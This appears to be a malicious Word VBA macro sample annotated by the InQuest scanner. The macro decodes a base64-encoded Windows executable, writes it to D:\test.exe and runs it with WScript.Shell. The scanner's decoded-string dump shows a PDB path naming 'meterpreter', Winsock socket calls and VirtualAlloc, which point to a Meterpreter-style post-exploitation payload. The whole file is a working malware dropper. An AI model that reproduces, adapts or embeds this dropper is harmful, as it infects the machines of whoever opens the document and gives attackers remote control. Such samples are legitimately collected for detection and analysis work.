BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AP8l4DBAAP8lxDBAAP8lwDBAAP8lADFAAP8l0DBAAP8lEDFAAP8l9DBAAP8l5DBAAP8lzDBAAP8lvDBA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AP8l7DBAAP8lrDBAAP8lpDBAAP8lDDFAAP8lyDBAAP8l8DBAAP8l1DBAAP8l2DBAAP8l3DBAAP8lIDBA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AMzMzMzMzMzMzMzMzMzMzItUJAiNQgyLSvgzyOj+8///uIg1QADpKP///8zMzMzMi1QkCI1CDItK/DPI"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "6N7z//+4tDVAAOkI////zMzMzMyNTdDpCPH//41N0OmQ8P//i1QkCI1CDItKzDPI6K7z//+42DVAAOnY"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/v//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB0OAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "hDgAAJQ4AACUPwAAfj8AAGQ/AABOPwAAND8AABg/AAAEPwAA8D4AANI+AAC2PgAAqD8AAAAAAAD2OAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "GDkAAFQ5AACOOQAA1DkAABY6AABWOgAAlDoAANY6AAAWOwAAZjsAAAAAAAC0OwAAyjsAANw7AADmOwAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAHQAAIC4OAAAcwAAgMo4AADYOAAAbwAAgAAAAAA+PAAARjwAAJA9AAAAAAAAej0AAAAAAAByPAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAEI9AADwPAAA5DwAALA9AAA4PQAABj0AAOg9AAD2PQAABj4AAMI8AAAqPQAAoDwAAEw9AADMPQAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "HD0AAGI8AABQPAAA/jwAAIY8AAAAAAAAoD0AAA49AAASPAAAJDwAAAAAAAAyIEAAAAAAACwaQAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAIAZQAAkGkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYQEAAaEBAAFdTQVN0YXJ0dXAoKSBmYWlsZWQ6"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "ICVkCgAAAABXU0FTb2NrZXQoKSBmYWlsZWQ6AAAAAAAAAAAAAAAAAN9h1V0AAAAAAgAAAE8AAACwMgAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "sBwAAAAAAADfYdVdAAAAAAwAAAAUAAAAADMAAAAdAAAAAAAA32HVXQAAAAANAAAAZAIAABQzAAAUHQAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAN9h1V0AAAAADgAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQACgMkAABAAAACAxQAAAAAAAAAAAAAAAAAAAAQAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAADbIgAAYCUAAIAlAACwJQAAUlNEU/fktTuA7Q9PjJy8xBrGqzMCAAAARDpcd2VidG9vbFxw"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "b3N0X2V4cFxtZXRlcnByZXRlcuWFjeadgFxSZWxlYXNlXHRlc3QucGRiAAAAAAAAIAAAACAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "HgAAAEdDVEwAEAAAYBUAAC50ZXh0JG1uAAAAAGAlAABrAAAALnRleHQkeAAAMAAAIAEAAC5pZGF0YSQ1"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAACAxAAAEAAAALjAwY2ZnAAAkMQAABAAAAC5DUlQkWENBAAAAACgxAAAEAAAALkNSVCRYQ0FBAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "LDEAAAQAAAAuQ1JUJFhDWgAAAAAwMQAABAAAAC5DUlQkWElBAAAAADQxAAAEAAAALkNSVCRYSUFBAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "ODEAAAQAAAAuQ1JUJFhJQUMAAAA8MQAABAAAAC5DUlQkWElaAAAAAEAxAAAEAAAALkNSVCRYUEEAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "RDEAAAQAAAAuQ1JUJFhQWgAAAABIMQAABAAAAC5DUlQkWFRBAAAAAEwxAAAEAAAALkNSVCRYVFoAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "UDEAAFABAAAucmRhdGEAAKAyAAAQAAAALnJkYXRhJHN4ZGF0YQAAALAyAADIAgAALnJkYXRhJHp6emRi"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "ZwAAAHg1AAAEAAAALnJ0YyRJQUEAAAAAfDUAAAQAAAAucnRjJElaWgAAAACANQAABAAAAC5ydGMkVEFB"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAIQ1AAAEAAAALnJ0YyRUWloAAAAAiDUAAAQBAAAueGRhdGEkeAAAAACMNgAAtAAAAC5pZGF0YSQy"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAEA3AAAUAAAALmlkYXRhJDMAAAAAVDcAACABAAAuaWRhdGEkNAAAAAB0OAAASAcAAC5pZGF0YSQ2"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAABAAAAYAAAALmRhdGEAAAAYQAAAeAMAAC5ic3MAAAAAAFAAAGAAAAAucnNyYyQwMQAAAABgUAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "gAEAAC5yc3JjJDAyAAAAAAAAAAAAAAAAAAAAAAAAAAAiBZMZAQAAAKw1QAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAUAAAD/////qSRAACIFkxkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAAACIFkxkGAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/DVAAAEAAAAsNkAAAAAAAAAAAAAAAAAAAQAAAP////+gJUAA/////6glQAABAAAAAAAAAAEAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/////6kkQAAEAAAAqSRAAAIAAAACAAAAAwAAAAEAAABANkAAQAAAAAAAAAAAAAAAthhAAP7///8AAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "zP///wAAAAD+////ZRtAAHkbQAAAAAAA/v///wAAAADY////AAAAAP7///+hHkAAtB5AAFQ3AAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAKo4AAAAMAAA1DcAAAAAAAAAAAAA6jgAAIAwAACQNwAAAAAAAAAAAACmOwAAPDAAAMA3AAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAA8AABsMAAAYDgAAAAAAAAAAAAAEj4AAAwxAADwNwAAAAAAAAAAAAAyPgAAnDAAABA4AAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAFI+AAC8MAAACDgAAAAAAAAAAAAAdD4AALQwAAAAOAAAAAAAAAAAAACUPgAArDAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAdDgAAIQ4AACUOAAAlD8AAH4/AABkPwAATj8AADQ/AAAYPwAABD8AAPA+AADSPgAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "tj4AAKg/AAAAAAAA9jgAABg5AABUOQAAjjkAANQ5AAAWOgAAVjoAAJQ6AADWOgAAFjsAAGY7AAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "tDsAAMo7AADcOwAA5jsAAAAAAAB0AACAuDgAAHMAAIDKOAAA2DgAAG8AAIAAAAAAPjwAAEY8AACQPQAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAHo9AAAAAAAAcjwAAAAAAABCPQAA8DwAAOQ8AACwPQAAOD0AAAY9AADoPQAA9j0AAAY+AADCPAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "Kj0AAKA8AABMPQAAzD0AABw9AABiPAAAUDwAAP48AACGPAAAAAAAAKA9AAAOPQAAEjwAACQ8AAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "vgVWaXJ0dWFsQWxsb2MAAF0CR2V0TGFzdEVycm9yAAAWAkdldEN1cnJlbnRQcm9jZXNzSWQAS0VSTkVM"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "MzIuZGxsAAAuAFdTQUV2ZW50U2VsZWN0AABXAFdTQVNvY2tldFcAACQAV1NBQ3JlYXRlRXZlbnQAAFdT"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "Ml8zMi5kbGwAAB4FP3VuY2F1Z2h0X2V4Y2VwdGlvbkBzdGRAQFlBX05YWgCiAj9jZXJyQHN0ZEBAM1Y/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAMUBBAAA0BT93aWRlbkA/JGJhc2lj"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "X2lvc0BEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFCRUREQFoA4QQ/c3B1dG5APyRiYXNpY19z"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "dHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVfSlBCRF9KQFoAAGEEP3B1dEA/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVBQVYxMkBEQFoAAN4E"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "P3NwdXRjQD8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFSERA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "WgBEAj9fT3NmeEA/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVY"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "WFoAAGgDP2ZsdXNoQD8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFB"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "RUFBVjEyQFhaAMUEP3NldHN0YXRlQD8kYmFzaWNfaW9zQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "ZEBAUUFFWEhfTkBaAAAGAT8/Nj8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBz"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "dGRAQFFBRUFBVjAxQFA2QUFBVjAxQEFBVjAxQEBaQFoAAP8APz82PyRiYXNpY19vc3RyZWFtQERVPyRj"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "aGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFQUFWMDFASEBaAABNU1ZDUDE0MC5kbGwAABAAX19DeHhG"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "cmFtZUhhbmRsZXIzAAAjAF9fc3RkX3Rlcm1pbmF0ZQBIAG1lbXNldAAANQBfZXhjZXB0X2hhbmRsZXI0"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "X2NvbW1vbgBWQ1JVTlRJTUUxNDAuZGxsAAAAAF9fYWNydF9pb2JfZnVuYwADAF9fc3RkaW9fY29tbW9u"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "X3ZmcHJpbnRmABgAZnJlZQAAGQBtYWxsb2MAAEIAX3NlaF9maWx0ZXJfZXhlAEQAX3NldF9hcHBfdHlw"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "ZQAuAF9fc2V0dXNlcm1hdGhlcnIAABkAX2NvbmZpZ3VyZV9uYXJyb3dfYXJndgAANQBfaW5pdGlhbGl6"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "ZV9uYXJyb3dfZW52aXJvbm1lbnQAACoAX2dldF9pbml0aWFsX25hcnJvd19lbnZpcm9ubWVudAA4AF9p"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "bml0dGVybQA5AF9pbml0dGVybV9lAFgAZXhpdAAAJQBfZXhpdABUAF9zZXRfZm1vZGUAAAUAX19wX19f"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "YXJnYwAABgBfX3BfX19hcmd2AAAXAF9jZXhpdAAAFgBfY19leGl0AD8AX3JlZ2lzdGVyX3RocmVhZF9s"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "b2NhbF9leGVfYXRleGl0X2NhbGxiYWNrAAAIAF9jb25maWd0aHJlYWRsb2NhbGUAFgBfc2V0X25ld19t"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "b2RlAAEAX19wX19jb21tb2RlAAA2AF9pbml0aWFsaXplX29uZXhpdF90YWJsZQAAPgBfcmVnaXN0ZXJf"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "b25leGl0X2Z1bmN0aW9uAB8AX2NydF9hdGV4aXQAHQBfY29udHJvbGZwX3MAAGoAdGVybWluYXRlAGFw"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "aS1tcy13aW4tY3J0LXN0ZGlvLWwxLTEtMC5kbGwAYXBpLW1zLXdpbi1jcnQtaGVhcC1sMS0xLTAuZGxs"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AABhcGktbXMtd2luLWNydC1ydW50aW1lLWwxLTEtMC5kbGwAYXBpLW1zLXdpbi1jcnQtbWF0aC1sMS0x"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "LTAuZGxsAABhcGktbXMtd2luLWNydC1sb2NhbGUtbDEtMS0wLmRsbAAApQVVbmhhbmRsZWRFeGNlcHRp"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "b25GaWx0ZXIAAGUFU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyABUCR2V0Q3VycmVudFByb2Nlc3MA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "hAVUZXJtaW5hdGVQcm9jZXNzAACBA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQARgRRdWVyeVBlcmZv"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "cm1hbmNlQ291bnRlcgAaAkdldEN1cnJlbnRUaHJlYWRJZAAA5QJHZXRTeXN0ZW1UaW1lQXNGaWxlVGlt"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "ZQBeA0luaXRpYWxpemVTTGlzdEhlYWQAegNJc0RlYnVnZ2VyUHJlc2VudAB0AkdldE1vZHVsZUhhbmRs"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "ZVcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAATuZAu7EZv0T/////AQAAAAEAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "GAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEACQQAAEgAAABgUAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "fQEAAAAAAAAAAAAAAAAAAAAAAAA8P3htbCB2ZXJzaW9uPScxLjAnIGVuY29kaW5nPSdVVEYtOCcgc3Rh"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "bmRhbG9uZT0neWVzJz8+DQo8YXNzZW1ibHkgeG1sbnM9J3VybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "YXNtLnYxJyBtYW5pZmVzdFZlcnNpb249JzEuMCc+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hl"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "bWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVk"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "UHJpdmlsZWdlcz4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSdhc0ludm9r"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "ZXInIHVpQWNjZXNzPSdmYWxzZScgLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAQAADsAAAACjC/NBo1NTU/NUU1VTVdNW81eTV/NYU1kzWbNac1rzW+Ncw1"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "1zXxNQ82KjZGNlM2ZzZzNrY2wjYGNxg30zcvOE84WTiFOMY4yzjpOPY4BTlSOV45ZjlxObg54TlBOmw6"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "gTqGOos6rDqxOr46+DrHO9A72zviOwI8CDwOPBQ8GjwgPCc8Ljw1PDw8QzxKPFE8WTxhPGk8dTx+PIM8"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "iTyTPJ08rTy9PM081jw4PWQ9mj3DPdI95T3xPQE+Ej4oPj8+VD5bPmE+cz59Pts+6D4PPxc/MD9vP34/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "hz+UP6w/5j/vPwAAACAAAJgAAAADMAkwNDBaMGMwaTBHMWcxcTGOMc4x1DEcMiUyKjI9MlEyVjJpMoEy"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "njLrMvAyAzMRMywzNzPLM9Qz3DMYNCw0MzRjNGw0dTSDNIw0mzSlNKs0sTS3NL00wzTJNM801TTbNOE0"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "5zTtNPM0+TT/NAU1CzURNRc1HTUjNSk1LzU1NTs1QTVHNU01cjWSNcI1AAAAMAAAOAAAACAxKDE0MTgx"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "UDFUMTwyQDJIMpA1sDXgNeg1ADYINiA2KDY8Nkw2ZDZoNoQ2iDYAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    vData = Base64Decode(BzjVmHNXTFZsFi)
    Dim FilePath As String
    FilePath = "D:\test.exe"
    Open FilePath For Binary Access Write As #1
    Put #1, 1, vData
    Close #1

MsgBox Base64DecodeString(BzjVmHNXTFZsFi)
CreateObject("WScript.Shell").Run "d:\test.exe"





End Sub

Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

' InQuest injected base64 decoded content
' !This program cannot be run in DOS mode.
' Richv
' .text
' `.rdata
' @.data
' .rsrc
' @.reloc
' hunM
' PhX1@
' u)h@
' h`%@
' $SVW
' ht1@
' Y_^[
' hN"@
' hP6@
' h01@
' h,1@
' h$1@
' hP1@
' =LC@
' u"h4C@
' h@C@
' j Y+
' hp6@
' =XC@
' h4C@
' h`C@
' 8csm
' %pC@
' Y__^[
' %tC@
' ntel
' 5ineI
' t#=`
' =xC@
' =xC@
' =xC@
' =xC@
' %l0@
' %p0@
' %t0@
' %x0@
' % 0@
' WSAStartup() failed:
' WSASocket() failed:
' RSDS
' D:\webtool\p
' ost_exp\meterpreter
' \Release\test.pdb
' GCTL
' .text$mn
' .text$x
' .idata$5
' .00cfg
' .CRT$XCA
' .CRT$XCAA
' .CRT$XCZ
' .CRT$XIA
' .CRT$XIAA
' .CRT$XIAC
' .CRT$XIZ
' .CRT$XPA
' .CRT$XPZ
' .CRT$XTA
' .CRT$XTZ
' .rdata
' .rdata$sxdata
' .rdata$zzzdb
' .rtc$IAA
' .rtc$IZZ
' .rtc$TAA
' .rtc$TZZ
' .xdata$x
' .idata$2
' .idata$3
' .idata$4
' .idata$6
' .data
' .bss
' .rsrc$01
' .rsrc$02
' VirtualAlloc
' GetLastError
' GetCurrentProcessId
' KERNEL
' 32.dll
' WSAEventSelect
' WSASocketW
' WSACreateEvent
' 2_32.dll
' ?uncaught_exception@std@@YA_NXZ
' ?cerr@std@@3V?
' $basic_ostream@DU?$char_traits@D@std@@@1@A
' ?widen@?$basic
' _ios@DU?$char_traits@D@std@@@std@@QBEDD@Z
' ?sputn@?$basic_s
' treambuf@DU?$char_traits@D@std@@@std@@QAE_JPBD_J@Z
' ?put@?
' $basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z
' ?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@
' ?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEX
' ?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QA
' EAAV12@XZ
' ?setstate@?$basic_ios@DU?$char_traits@D@std@@@st
' d@@QAEXH_N@Z
' ??6?$basic_ostream@DU?$char_traits@D@std@@@s
' td@@QAEAAV01@P6AAAV01@AAV01@@Z@Z
' ??6?$basic_ostream@DU?$c
' har_traits@D@std@@@std@@QAEAAV01@H@Z
' MSVCP140.dll
' __CxxF
' rameHandler3
' __std_terminate
' memset
' _except_handler4
' _common
' VCRUNTIME140.dll
' __acrt_iob_func
' __stdio_common
' _vfprintf
' free
' malloc
' _seh_filter_exe
' _set_app_typ
' __setusermatherr
' _configure_narrow_argv
' _initializ
' e_narrow_environment
' _get_initial_narrow_environment
' nitterm
' _initterm_e
' exit
' _exit
' _set_fmode
' __p___
' argc
' __p___argv
' _cexit
' _c_exit
' _register_thread_l
' ocal_exe_atexit_callback
' _configthreadlocale
' _set_new_m
' __p__commode
' _initialize_onexit_table
' _register_
' onexit_function
' _crt_atexit
' _controlfp_s
' terminate
' i-ms-win-crt-stdio-l1-1-0.dll
' api-ms-win-crt-heap-l1-1-0.dll
' api-ms-win-crt-runtime-l1-1-0.dll
' api-ms-win-crt-math-l1-1
' -0.dll
' api-ms-win-crt-locale-l1-1-0.dll
' UnhandledExcepti
' onFilter
' SetUnhandledExceptionFilter
' GetCurrentProcess
' TerminateProcess
' IsProcessorFeaturePresent
' QueryPerfo
' rmanceCounter
' GetCurrentThreadId
' GetSystemTimeAsFileTim
' InitializeSListHead
' IsDebuggerPresent
' GetModuleHandl
' <?xml version='1.0' encoding='UTF-8' sta
' ndalone='yes'?>
' <assembly xmlns='urn:schemas-microsoft-com:
' asm.v1' manifestVersion='1.0'>
'   <trustInfo xmlns="urn:sche
' mas-microsoft-com:asm.v3">
'     <security>
'       <requested
' Privileges>
'         <requestedExecutionLevel level='asInvok
' er' uiAccess='false' />
'       </requestedPrivileges>
'     <
' /security>
'   </trustInfo>
' </assembly>
' 555?5E5U5]5o5y5
' 6*6F6S6g6s6
' 7/8O8Y8
' 9R9^9f9q9
' 9A:l:
' < <'<.<5<<<C<J<Q<Y<a<i<u<~<
' <8=d=
' >(>?>T>[>a>s>}>
' ?0?o?~?
' 0	040Z0c0i0G1g1q1
' 2%2*2=2Q2V2i2
' 3,373
' 4,434c4l4u4
' 5#5)5/555;5A5G5M5r5
'  1(14181
' P1T1<2@2H2
' 6 6(6<6L6d6h6

INQUEST-PP=macro
